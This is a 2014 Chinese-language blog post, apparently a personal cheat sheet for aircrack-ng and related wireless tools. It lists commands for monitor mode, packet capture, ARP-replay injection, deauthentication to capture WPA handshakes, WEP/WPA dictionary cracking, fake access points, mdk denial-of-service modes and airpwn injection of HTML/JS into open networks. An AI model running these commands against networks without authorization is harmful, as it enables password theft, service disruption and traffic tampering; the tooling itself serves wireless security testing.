---
author: sn0rt
comments: true
date: 2014-07-12
layout: post
title: wireless tools
tag: security
---

## 0x00 net-wireless/aircrack-ng

  * airbase-ng: 中间人攻击，伪造 ap 并且将无线的流量转发到有线网络
  * aircrack-ng: 主要用于 wep 以及 wpa-psk 的恢复，依赖于 dump 的数据包，此工具就可以自动测试是否可以破解
  * airdecap-ng: 用来解开加密状态的数据包
  * airdecloak-ng: 用于分析无线数据报文时过滤出指定无线网络数据	
  * airdriver-ng: 用户查看工具包支持的芯片
  * airdrop-ng: 基于策略的无线 Deauth 的工具
  * aireplay-ng: 在进行 wep 和 wap-psk 的密码恢复时候，可以根据需要创建特殊的无线数据包报文	
  * airgraph-ng	
  * airmon-ng: 网卡监控模式
  * airodump-ng: 抓取空中传播的数据包	
  * airolib-ng: 进行 wpa 彩虹表攻击时使用，用于建立特定的数据库文件	
  * airserv-ng: 可以将无线网卡连接到特定端口，为攻击时灵活调用准备	
  * airtun-ng:
  * besside-ng
  * easside-ng: 用户 wep 的自动破解
  * packetforge-ng: 主要用于构造特殊的数据包，用于无客户端的破解
  * tkiptun-ng: 主要针对 wpa tkip 中启用 qos 的网络的注入
  * wesside-ng
  
文档链接 [^wiki]
	
## 0x01 start interface monitor mode

参数说明：

```shell
root@kail:~/wireless# airmon-ng start waln0
```

## 0x02 capture the wireless frames

参数说明：-w 后面是写入文件，--ivs 酌情使用，-c 后面是信道

```shell
root@kali:~/wireless# airodump-ng -w hg -c 6 mon0
```
	
## 0x03 generate request

wep 的 Request 注入攻击加快有效的数据包生成, 参数说明：
-3 (--arpreplay) 就是攻击编号，-b 后面是 ap 的 MAC，-h 后面是 Client 的 MAC

```shell
root@kali:~/wireless# aireplay-ng -3 -b 9C:21:6A:7E:2C:EC -h 64:5A:04:33:75:18 mon0
```

wap 的 Deauth 攻击获取 wpa 的握手报文：
参数说明：-0 (--deauth) 就是攻击编号, 后面是数据包数量，-a 后面是 ap 的 MAC，-c 后面是 Client 的 MAC
    
```shell
root@kali:~/wireless# aireplay-ng -0 1 -a 9C:21:6A:7E:2C:EC -c 64:5A:04:33:75:18 mon0
```

## 0x04 crack the password

web 的破解, 后面是.cap 或者 ivs 文件

```shell
root@kali:~/wireless# aircrack-ng hg-01.cap
```

对于 wpa 的破解,-w 后面是字典文件

```shell
root@kali:~/wireless# aircrack-ng -w /usr/share/dictionary/words hg-01.cap
```
	
### 0x05 aux tools

.cap 提取.ivs 文件：

```shell
root@kali:~/wireless# ivstools --convert hg-05.cap hg-05.ivs
```

把.ivs 文件合成一个：

```shell
root@kali:~/wireless# ivstools  --merge hg-01.ivs hg-02.ivs hg-05.ivs hg.ivs
```
    
    
解密无线数据帧，参数说明：-l 不移除 802.11 头部

```shell
root@kali:~/wireless# airdecap-ng -l -e ESSID -p password hg-01.cap
```

热点伪造

```shell
root@kali:~/wireless# airbase-ng -c 6 -A -Z 2 mon0
```
    
无线跳板的工具

```shell
#  airserv-ng    
Airserv-ng 1.2 beta3 - (C) 2007, 2008, 2009 Andrea Bittau
http://www.aircrack-ng.org

Usage: airserv-ng <options>

Options:

	 -h			: This help screen
	 -p	 <port> : TCP port to listen on (default:666)
	 -d <iface> : Wifi interface to use
	 -c	 <chan> : Channel to use
	 -v <level> : Debug level (1 to 3; default: 1)
```
           
基于策略的无线 Deauth，下面策略的语法

```shell
#deny rules
d/0a:00:27:00:00:03|dc:0e:a1:f4:3f:01
Deny	AP				Client
#------------------
a/any|any

# wireless airdrop-ng -i mon0 -t hg-01.csv -r rule
```

对抓取的数据包内容进行过滤（其实可以在 dump 时候用参数指定）

```shell
# wireless  airdecloak-ng --bssid 0a:00:27:00:00:03 --filters signal -i hg-01.cap
```

wps 扫描工具 [这里](http://www.sourcesec.com/Lab/wps_tools.tar.gz) 下载,wpscan.py(扫描开启的无线路由器),wpspy.py(检测 wps 的状态).
fix: 如果运行出现：Caught exception sniffing packets: global name 'sniff' is not defined 解决方案，修改一下 python 构造包的倒入，我下面的方法是简化的，但是意思一样

```python
#!/usr/bin/env python

from sys import argv, stderr, exit
from getopt import GetoptError, getopt as GetOpt
from scapy.all import *
```

无线 dos 工具:mdk

```shell
b	- Beacon Flood Mode
	  Sends beacon frames to show fake APs at clients.
	  This can sometimes crash network scanners and even drivers!
a	- Authentication DoS mode
	  Sends authentication frames to all APs found in range.
	  Too much clients freeze or reset some APs.
p	- Basic probing and ESSID Bruteforce mode
	  Probes AP and check for answer, useful for checking if SSID has
	  been correctly decloaked or if AP is in your adaptors sending range
	  SSID Bruteforcing is also possible with this test mode.
d	- Deauthentication / Disassociation Amok Mode
	  Kicks everybody found from AP
m	- Michael shutdown exploitation (TKIP)
	  Cancels all traffic continuously
x	- 802.1X tests
w	- WIDS/WIPS Confusion
	  Confuse/Abuse Intrusion Detection and Prevention Systems
f	- MAC filter bruteforce mode
	  This test uses a list of known client MAC Adresses and tries to
	  authenticate them to the given AP while dynamically changing
	  its response timeout for best performance. It currently works only
	  on APs who deny an open authentication request properly
g	- WPA Downgrade test
	  deauthenticates Stations and APs sending WPA encrypted packets.
	  With this test you can check if the sysadmin will try setting his
	  network to WEP or disable encryption.
```

无线欺骗 net-wireless/airpwn, 通过无线数据包匹配的地方修改替换掉，并且伪装为 AP 发送数据

```shell
# cat /usr/share/airpwn/conf/js_html 
begin js_html
match ^(GET|POST)
ignore ^GET [^ ?]+\.(jpg|jpeg|gif|png|tif|tiff)
response /usr/share/airpwn/content/js_html
```

语法类似

```shell
# airpwn -c /usr/share/airpwn/conf/greet_html -i mon0 -d mac80211 -vvv -F
```

针对 open 的，-k 参数后面可以加 wep 的密码，wap 没有看到参数.

[^wiki]: [wiki](https://www.aircrack-ng.org/doku.php)
